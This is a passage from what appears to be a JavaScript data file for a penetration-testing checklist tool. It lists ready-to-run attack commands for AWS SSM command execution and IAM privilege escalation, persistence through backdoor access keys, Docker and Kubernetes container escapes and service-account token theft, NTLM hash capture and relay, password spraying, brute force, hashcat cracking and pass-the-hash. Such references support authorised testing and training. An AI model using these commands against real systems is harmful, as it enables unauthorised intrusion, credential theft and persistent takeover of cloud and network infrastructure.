        name: "EC2 / SSM Exec",
        items: [
          { label: "List instances & roles", hint: "aws ec2 describe-instances --profile loot" },
          { label: "Run commands on managed instances via SSM", hint: "aws ssm send-command --document-name AWS-RunShellScript --targets Key=InstanceIds,Values=<id> --parameters commands='id' --profile loot" },
          { label: "Read command output", hint: "aws ssm list-command-invocations --command-id <id> --details --profile loot" },
          { label: "Read EC2 user-data for secrets", hint: "curl http://169.254.169.254/latest/user-data" }
        ]
      },
      {
        name: "Privesc & Persistence",
        items: [
          { label: "iam:CreatePolicyVersion → set admin as default version", hint: "aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default --profile loot" },
          { label: "iam:PassRole + service (Lambda/EC2/Glue) to assume admin role" },
          { label: "sts:AssumeRole into a more privileged role", hint: "aws sts assume-role --role-arn <arn> --role-session-name p --profile loot" },
          { label: "Persistence: create access keys for another user", hint: "aws iam create-access-key --user-name <USER> --profile loot" },
          { label: "Persistence: add a login profile / backdoor role trust policy" }
        ]
      }
    ]
  },
  {
    id: "container-k8s",
    name: "Containers & Kubernetes",
    icon: "📦",
    desc: "Enumerate & escape: privileged pod, hostPath, SA token, node breakout.",
    phases: [
      {
        name: "Am I in a Container?",
        items: [
          { label: "Check for container cgroups / .dockerenv", hint: "cat /proc/1/cgroup; ls -la /.dockerenv" },
          { label: "Check capabilities of current process", hint: "capsh --print" },
          { label: "Identify mounted host paths / sensitive mounts", hint: "mount; cat /proc/self/mountinfo" },
          { label: "Enumerate env vars for secrets/tokens", hint: "env" }
        ]
      },
      {
        name: "Docker Escape",
        items: [
          { label: "Privileged container → mount host disk", hint: "fdisk -l; mount /dev/sda1 /mnt && chroot /mnt sh" },
          { label: "CAP_SYS_ADMIN + cgroup release_agent escape" },
          { label: "Docker socket mounted → spawn host container", hint: "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh" },
          { label: "Writable /var/run/docker.sock via curl API", hint: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json" }
        ]
      },
      {
        name: "Kubernetes Recon",
        items: [
          { label: "Locate the service-account token", hint: "cat /var/run/secrets/kubernetes.io/serviceaccount/token" },
          { label: "Set up kubectl / raw API with the token", hint: "export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" },
          { label: "Check what the SA can do", hint: "kubectl auth can-i --list --token=$TOKEN" },
          { label: "List pods/secrets if permitted", hint: "kubectl get secrets -A --token=$TOKEN" },
          { label: "Query API server directly", hint: "curl -sk -H \"Authorization: Bearer $TOKEN\" https://<TARGET_IP>:6443/api/v1/namespaces/default/pods" }
        ]
      },
      {
        name: "Cluster Escape / Node Takeover",
        items: [
          { label: "If you can create pods → deploy a privileged hostPath pod" },
          { label: "Privileged pod spec mounts host root", hint: "kubectl apply -f privesc-pod.yaml --token=$TOKEN" },
          { label: "Exec into the escape pod & chroot the node", hint: "kubectl exec -it privesc -- chroot /host bash" },
          { label: "Steal kubelet creds / other pods' SA tokens from node", hint: "find /host -path '*kubernetes.io/serviceaccount/token' 2>/dev/null" },
          { label: "cluster-admin token → dump all secrets", hint: "kubectl get secrets -A -o json --token=$TOKEN" }
        ]
      }
    ]
  },
  {
    id: "password-attacks",
    name: "Password & Hash Attacks",
    icon: "🔑",
    desc: "Spraying, responder capture, hash cracking (hashcat modes), credential reuse.",
    phases: [
      {
        name: "Build Wordlists & Users",
        items: [
          { label: "Scrape a target site into a wordlist", hint: "cewl -d 3 -m 6 http://<TARGET_IP> -w cewl.txt" },
          { label: "Mutate a base list with rules (hashcat rules)", hint: "hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt" },
          { label: "Generate targeted passwords from OSINT", hint: "cupp -i" },
          { label: "Build a username list (first.last, flast, etc.)", hint: "./username-anarchy <firstname> <lastname>" }
        ]
      },
      {
        name: "Capture Hashes (Network)",
        items: [
          { label: "Responder to grab NetNTLMv2", hint: "sudo responder -I tun0" },
          { label: "Relay instead of crack if signing off", hint: "impacket-ntlmrelayx -tf targets.txt -smb2support" },
          { label: "SMB/WinRM/etc capture via mitm6 (IPv6)", hint: "sudo mitm6 -d <DOMAIN>" }
        ]
      },
      {
        name: "Password Spraying",
        items: [
          { label: "SMB spray one password across many users", hint: "nxc smb <TARGET_IP> -u users.txt -p 'Autumn2026!' --continue-on-success" },
          { label: "Check lockout policy BEFORE spraying", hint: "nxc smb <DC_IP> -u <USER> -p <PASSWORD> --pass-pol" },
          { label: "Kerberos spray (stealthier, no lockout on bad pw pre-auth)", hint: "kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Autumn2026!'" },
          { label: "Spray web login / OWA / RDP as applicable", hint: "hydra -L users.txt -p 'Autumn2026!' <TARGET_IP> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'" }
        ]
      },
      {
        name: "Online Brute (Single Service)",
        items: [
          { label: "SSH", hint: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>" },
          { label: "FTP", hint: "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>" },
          { label: "HTTP basic / form", hint: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /" }
        ]
      },
      {
        name: "Offline Hash Cracking (hashcat modes)",
        items: [
          { label: "Identify the hash type first", hint: "hashid '<HASH>'" },
          { label: "MD5 (0) / SHA1 (100) / SHA256 (1400)", hint: "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt" },
          { label: "NTLM (1000)", hint: "hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt" },
          { label: "NetNTLMv2 (5600)", hint: "hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt" },
          { label: "Kerberoast TGS (13100) / AS-REP (18200)", hint: "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt" },
          { label: "bcrypt (3200) / sha512crypt $6$ (1800)", hint: "hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt" },
          { label: "Add rules to extend coverage", hint: "hashcat -m 1000 nt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule" },
          { label: "John fallback with unshadow", hint: "unshadow passwd shadow > crack.db && john crack.db --wordlist=/usr/share/wordlists/rockyou.txt" }
        ]
      },
      {
        name: "Credential Reuse",
        items: [
          { label: "Spray cracked creds across all hosts/services", hint: "nxc smb <NETWORK>/<CIDR> -u <USER> -p <PASSWORD> --continue-on-success" },
          { label: "Pass-the-Hash where cracking failed", hint: "nxc smb <NETWORK>/<CIDR> -u <USER> -H <HASH>" },
          { label: "Try the same password on SSH / web / DB / vault" },
          { label: "Note every valid credential in your loot log" }
        ]
      }
    ]
  }
];
